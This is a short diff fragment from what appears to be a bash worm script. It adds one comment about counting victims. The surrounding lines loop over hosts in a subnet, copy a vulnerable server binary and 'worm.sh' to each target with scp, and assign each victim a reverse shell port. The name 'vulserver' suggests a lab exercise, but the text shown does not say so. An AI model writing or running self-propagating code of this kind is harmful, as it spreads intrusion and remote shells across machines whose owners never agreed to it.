@@ -33,6 +33,7 @@ for i in $(seq 1 254); do
                 scp /home/server/vulserver $USER@$TARGET:/tmp/vulserver
                 scp /tmp/worm.sh $USER@$TARGET:/tmp/worm.sh
 
+                # Count PORT in case of multiple victims
                 PORT=$((PORT_BASE + COUNT))
                 echo "[*] Assigning reverse shell port: $PORT"
 
